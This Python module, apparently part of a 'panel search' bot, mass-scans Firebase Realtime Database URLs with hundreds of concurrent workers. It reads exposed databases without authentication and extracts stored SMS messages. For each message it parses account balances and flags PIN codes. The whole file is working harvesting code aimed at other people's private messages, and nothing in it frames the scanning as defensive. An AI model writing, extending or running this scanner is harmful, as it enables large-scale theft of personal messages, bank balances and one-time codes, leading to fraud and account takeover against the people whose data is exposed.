from __future__ import annotations

import asyncio
import time
from typing import Any, Awaitable, Callable

import httpx

from panel_search_bot.config import get_settings
from panel_search_bot.firebase_urls import firebase_url_variants
from panel_search_bot.sms_parser import extract_message_fields, message_has_pin, parse_balance

FAST_SUBPATHS = ("messages", "sms", "")
EXTRA_SUBPATHS = ("inbox", "sms_list", "data")
DATA_TOP_KEYS = frozenset(
    {
        "messages",
        "sms",
        "devices",
        "device",
        "inbox",
        "phones",
        "clients",
        "users",
        "data",
        "sms_list",
        "smsList",
        "all_sms",
    }
)
MESSAGE_KEYS = frozenset({"message", "body", "text", "content", "sms"})


def _json_url(base: str, path: str = "", shallow: bool = False) -> str:
    base = base.rstrip("/")
    if path:
        path = path.strip("/")
        url = f"{base}/{path}.json"
    else:
        url = f"{base}/.json"
    if shallow:
        url += "?shallow=true"
    return url


def _walk_sms(node: Any, path: str, out: list[dict], depth: int = 0) -> None:
    if depth > 8:
        return
    if isinstance(node, dict):
        if MESSAGE_KEYS.intersection(node.keys()):
            sender, body, ts = extract_message_fields(node)
            if body and len(body.strip()) >= 4:
                out.append(
                    {
                        "sender": sender,
                        "body": body,
                        "message_at": ts,
                        "balance": parse_balance(body),
                        "has_pin": message_has_pin(body),
                        "raw_path": path,
                    }
                )
        for key, value in node.items():
            if key in ("metadata", "config", "settings"):
                continue
            _walk_sms(value, f"{path}/{key}" if path else str(key), out, depth + 1)
    elif isinstance(node, list):
        for index, item in enumerate(node):
            _walk_sms(item, f"{path}/{index}", out, depth + 1)


async def _fetch_json(client: httpx.AsyncClient, url: str, timeout: httpx.Timeout) -> Any | None:
    try:
        response = await client.get(url, timeout=timeout)
        if response.status_code in (401, 403, 404):
            return None
        response.raise_for_status()
        if not response.text or response.text.strip() == "null":
            return None
        return response.json()
    except Exception:
        return None


def _collect_from_data(data: Any, sub: str, collected: list[dict]) -> int:
    before = len(collected)
    _walk_sms(data, sub or "root", collected)
    return len(collected) - before


def _dedupe_sms(collected: list[dict], cap: int = 1500) -> list[dict]:
    seen: set[str] = set()
    unique: list[dict] = []
    for row in collected:
        sig = row["body"][:300]
        if sig in seen:
            continue
        seen.add(sig)
        unique.append(row)
        if len(unique) >= cap:
            break
    return unique


def _shallow_has_data(data: Any) -> bool:
    if data is None:
        return False
    if isinstance(data, dict):
        if not data:
            return False
        keys = {str(k).lower() for k in data.keys()}
        if keys & {k.lower() for k in DATA_TOP_KEYS}:
            return True
        junk = {"metadata", "config", "settings", "version", "info"}
        if keys <= junk:
            return False
        return len(data) > 0
    if isinstance(data, list):
        return len(data) > 0
    return False


async def quick_probe_firebase(
    client: httpx.AsyncClient, base_url: str
) -> tuple[str, bool, str]:
    """Returns (status, online, resolved_url) — status: dead | empty | ok."""
    settings = get_settings()
    timeout = httpx.Timeout(settings.panel_search_fetch_timeout, connect=1.0)
    variants = firebase_url_variants(base_url)[: max(1, settings.panel_search_variant_limit)]

    for variant in variants:
        root = await _fetch_json(client, _json_url(variant, "", shallow=True), timeout)
        if root is None:
            msg = await _fetch_json(client, _json_url(variant, "messages", shallow=True), timeout)
            if msg is None:
                continue
            if _shallow_has_data(msg):
                return "ok", True, variant
            return "empty", True, variant
        if _shallow_has_data(root):
            return "ok", True, variant
        return "empty", True, variant

    return "dead", False, base_url


async def fetch_sms_from_firebase(client: httpx.AsyncClient, base_url: str) -> tuple[bool, list[dict], str]:
    settings = get_settings()
    req_timeout = httpx.Timeout(settings.panel_search_fetch_timeout, connect=1.0)
    wall = min(settings.panel_search_per_db_timeout, 4.0)

    async def _inner() -> tuple[bool, list[dict], str]:
        status, online, working_url = await quick_probe_firebase(client, base_url)
        if status == "dead":
            return False, [], base_url
        if status == "empty":
            return False, [], working_url

        collected: list[dict] = []
        subpaths = FAST_SUBPATHS[: max(1, min(3, settings.panel_search_parallel_subpaths))]

        results = await asyncio.gather(
            *[_fetch_json(client, _json_url(working_url, sub), req_timeout) for sub in subpaths]
        )
        for sub, data in zip(subpaths, results):
            if data is None:
                continue
            if _collect_from_data(data, sub, collected) > 0:
                break

        if not collected:
            extra_n = min(2, len(EXTRA_SUBPATHS))
            extras = EXTRA_SUBPATHS[:extra_n]
            results = await asyncio.gather(
                *[_fetch_json(client, _json_url(working_url, sub), req_timeout) for sub in extras]
            )
            for sub, data in zip(extras, results):
                if data is None:
                    continue
                if _collect_from_data(data, sub, collected) > 0:
                    break

        if not collected:
            return online, [], working_url

        return True, _dedupe_sms(collected), working_url

    try:
        return await asyncio.wait_for(_inner(), timeout=wall)
    except asyncio.TimeoutError:
        return False, [], base_url


async def fetch_many(
    urls: list[str],
    *,
    on_progress: Callable[..., Awaitable[None]] | None = None,
    cancel_event: asyncio.Event | None = None,
    deadline: float | None = None,
) -> dict[str, tuple[bool, list[dict], str]]:
    settings = get_settings()
    workers = min(settings.worker_count, 384)
    sem = asyncio.Semaphore(workers)
    results: dict[str, tuple[bool, list[dict], str]] = {}
    total = len(urls)
    done_count = 0
    progress_lock = asyncio.Lock()
    limits = httpx.Limits(max_connections=min(workers + 32, 512), max_keepalive_connections=workers)
    timeout = httpx.Timeout(settings.panel_search_fetch_timeout, connect=1.0)
    if deadline is None:
        deadline = time.monotonic() + settings.panel_search_max_scan_sec

    async with httpx.AsyncClient(follow_redirects=True, limits=limits, timeout=timeout) as client:

        async def one(url: str) -> None:
            nonlocal done_count
            if cancel_event and cancel_event.is_set():
                return
            if time.monotonic() >= deadline:
                return
            async with sem:
                if (cancel_event and cancel_event.is_set()) or time.monotonic() >= deadline:
                    return
                online, sms_list, resolved = await fetch_sms_from_firebase(client, url)
            results[url] = (online, sms_list, resolved)
            async with progress_lock:
                done_count += 1
                current = done_count
            if on_progress:
                asyncio.create_task(on_progress(current, total, url, online, len(sms_list), resolved))

        await asyncio.gather(*(one(url) for url in urls))

    return results
